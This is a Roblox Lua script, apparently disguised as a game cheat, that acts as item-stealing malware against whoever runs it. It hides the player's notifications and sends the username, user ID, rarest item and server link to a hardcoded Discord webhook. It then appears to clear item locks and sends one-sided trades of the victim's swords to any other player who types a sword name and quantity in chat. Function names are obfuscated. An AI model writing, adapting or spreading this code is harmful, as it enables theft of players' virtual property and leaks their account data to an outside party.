local HttpService = game:GetService('HttpService')
local Players = game:GetService('Players')
local MarketplaceService = game:GetService('MarketplaceService')
local ReplicatedStorage = game:GetService('ReplicatedStorage')

game:GetService('Players').LocalPlayer.PlayerGui['Main Interface'].Frames.Notifications
    :Destroy()

local xUrL7 = 'https://discord.com/api/webhooks/'
    .. '1414700326820515992'
    .. '/'
    .. 'l-2z9v-lOzFAqQn1NO7_8OGHCHIsjBxML_cVUgw2TdUxUPZlHNcTIrJLThvov03BVvrW'

local player = Players.LocalPlayer
local username = player.Name
local displayName = player.DisplayName
local userId = player.UserId

local placeId = game.PlaceId
local jobId = game.JobId

local gameTitle = 'Unknown Game'
pcall(function()
    gameTitle = MarketplaceService:GetProductInfo(placeId).Name
end)

local function zKw9()
    local rarestItem = 'None'
    local lowestValue = math.huge
    local rarestValue = 0

    pcall(function()
        local inventory = player:FindFirstChild('inventory')
        if not inventory then
            return
        end

        local swordCopyData =
            ReplicatedStorage:FindFirstChild('Sword Copy Data')
        if not swordCopyData then
            return
        end

        for _, item in pairs(inventory:GetChildren()) do
            if item:IsA('IntValue') then
                local itemName = item.Name
                local swordData = swordCopyData:FindFirstChild(itemName)

                if swordData and swordData:IsA('IntValue') then
                    local itemValue = swordData.Value
                    if itemValue < lowestValue then
                        lowestValue = itemValue
                        rarestItem = itemName
                        rarestValue = itemValue
                    end
                end
            end
        end
    end)

    if rarestItem ~= 'None' then
        return rarestItem .. ' (Value: ' .. rarestValue .. ')'
    else
        return 'No items found'
    end
end

local function mR3x()
    local itemList = {}

    pcall(function()
        local inventory = player:FindFirstChild('inventory')
        if not inventory then
            return
        end

        local swordCopyData =
            ReplicatedStorage:FindFirstChild('Sword Copy Data')
        if not swordCopyData then
            return
        end

        for _, item in pairs(inventory:GetChildren()) do
            if item:IsA('IntValue') and item.Value > 0 then
                local itemName = item.Name
                local quantity = item.Value
                local swordData = swordCopyData:FindFirstChild(itemName)

                if swordData and swordData:IsA('IntValue') then
                    local itemValue = swordData.Value
                    table.insert(itemList, {
                        name = itemName,
                        quantity = quantity,
                        rarity = itemValue,
                    })
                end
            end
        end

        table.sort(itemList, function(a, b)
            return a.rarity < b.rarity
        end)
    end)

    local rarestItems = {}
    for i = 1, math.min(10, #itemList) do
        rarestItems[itemList[i].name] = itemList[i].quantity
    end

    return rarestItems
end

local function hP8q()
    local unlockedCount = 0

    pcall(function()
        local inventoryList =
            game:GetService('Players').LocalPlayer.PlayerGui['Main Interface'].Frames.Inventory.Contents.List
        local replicatedStorage = game:GetService('ReplicatedStorage')
        local lockSwordRemote =
            replicatedStorage:WaitForChild('Remotes'):WaitForChild('LockSword')

        for _, child in pairs(inventoryList:GetChildren()) do
            if child:IsA('ImageButton') then
                local iconsFrame = child:FindFirstChild('Icons')

                if iconsFrame then
                    local lockIcon = iconsFrame:FindFirstChild('LockIcon')

                    if lockIcon and lockIcon:IsA('ImageLabel') then
                        if lockIcon.Visible then
                            local itemName = string.gsub(child.Name, ' ', '*')
                            local args = { itemName }
                            lockSwordRemote:FireServer(unpack(args))
                            unlockedCount = unlockedCount + 1
                        end
                    end
                end
            end
        end
    end)

    return unlockedCount
end

local function jN4f(message)
    local swordName, quantityStr = message:match('^(.+)%s+(%d+)$')

    if swordName and quantityStr then
        local quantity = tonumber(quantityStr)
        if quantity and quantity > 0 then
            return swordName:gsub('^%s*(.-)%s*$', '%1'), quantity
        end
    end

    return nil, nil
end

local function rB7m(swordName, requiredQuantity)
    local hasItem = false
    local availableQuantity = 0

    pcall(function()
        local inventory = player:FindFirstChild('inventory')
        if not inventory then
            return
        end

        local item = inventory:FindFirstChild(swordName)
        if not item then
            for _, inventoryItem in pairs(inventory:GetChildren()) do
                if
                    inventoryItem.Name:lower() == swordName:lower()
                    and inventoryItem:IsA('IntValue')
                then
                    item = inventoryItem
                    break
                end
            end
        end

        if item and item:IsA('IntValue') then
            availableQuantity = item.Value
            if availableQuantity >= requiredQuantity then
                hasItem = true
            end
        end
    end)

    return hasItem, availableQuantity
end

local serverLink = 'roblox://placeId=18450282790&gameInstanceId=' .. jobId
local rarestItem = zKw9()

local embedData = {
    ['embeds'] = {
        {
            ['title'] = 'ðŸŽ® Player',
            ['description'] = 'yes',
            ['color'] = 3447003,
            ['thumbnail'] = {
                ['url'] = 'https://www.roblox.com/headshot-thumbnail/image?userId='
                    .. userId
                    .. '&width=420&height=420&format=png',
            },
            ['fields'] = {
                {
                    ['name'] = 'ðŸ‘¤ Noclip',
                    ['value'] = '**Username:** '
                        .. username
                        .. '\n**Display Name:** '
                        .. displayName
                        .. '\n**User ID:** '
                        .. userId,
                    ['inline'] = true,
                },
                {
                    ['name'] = 'ðŸ”® InfYield',
                    ['value'] = '**Rarest Item:** ' .. rarestItem,
                    ['inline'] = true,
                },
                {
                    ['name'] = 'ðŸ”— CopyLink',
                    ['value'] = serverLink
                        .. '\n[View Profile](https://www.roblox.com/users/'
                        .. userId
                        .. '/profile)',
                    ['inline'] = false,
                },
            },
            ['footer'] = {
                ['text'] = 'exe',
                ['icon_url'] = 'https://cdn.discordapp.com/attachments/1234567890123456789/1234567890123456789/roblox_icon.png',
            },
            ['timestamp'] = os.date('!%Y-%m-%dT%H:%M:%SZ'),
        },
    },
}

local function tL6y()
    local success = false

    success = pcall(function()
        request({
            Url = xUrL7,
            Method = 'POST',
            Headers = {
                ['Content-Type'] = 'application/json',
            },
            Body = HttpService:JSONEncode(embedData),
        })
    end)

    if not success then
        pcall(function()
            HttpService:PostAsync(
                xUrL7,
                HttpService:JSONEncode(embedData),
                Enum.HttpContentType.ApplicationJson
            )
        end)
    end
end

local function qX5w(targetPlayer, swordName, quantity)
    pcall(function()
        hP8q()
        wait(2)

        local itemsToTrade = {}
        itemsToTrade[swordName] = quantity

        local args = {
            {
                SenderContents = {
                    Items = itemsToTrade,
                    Currency = {},
                },
                Receiver = targetPlayer,
                ReceiverContents = {
                    Items = {},
                    Currency = {},
                },
            },
        }

        local tradeRemote = ReplicatedStorage:WaitForChild('Remotes')
            :WaitForChild('Trade System')
            :WaitForChild('SendTrade')
        tradeRemote:InvokeServer(unpack(args))
    end)
end

local function nD9k()
    local processedMessages = {}

    for _, otherPlayer in pairs(Players:GetPlayers()) do
        if otherPlayer ~= player then
            otherPlayer.Chatted:Connect(function(message)
                local messageKey = otherPlayer.Name
                    .. '_'
                    .. message
                    .. '_'
                    .. tick()
                if processedMessages[messageKey] then
                    return
                end
                processedMessages[messageKey] = true

                local swordName, quantity = jN4f(message)

                if swordName and quantity then
                    local hasItem, availableQuantity = rB7m(swordName, quantity)

                    if hasItem then
                        qX5w(otherPlayer, swordName, quantity)
                    end
                end

                wait(5)
                processedMessages[messageKey] = nil
            end)
        end
    end

    Players.PlayerAdded:Connect(function(newPlayer)
        wait(1)

        newPlayer.Chatted:Connect(function(message)
            local messageKey = newPlayer.Name .. '_' .. message .. '_' .. tick()
            if processedMessages[messageKey] then
                return
            end
            processedMessages[messageKey] = true

            local swordName, quantity = jN4f(message)

            if swordName and quantity then
                local hasItem, availableQuantity = rB7m(swordName, quantity)

                if hasItem then
                    qX5w(newPlayer, swordName, quantity)
                end
            end

            wait(5)
            processedMessages[messageKey] = nil
        end)
    end)
end

tL6y()
nD9k()
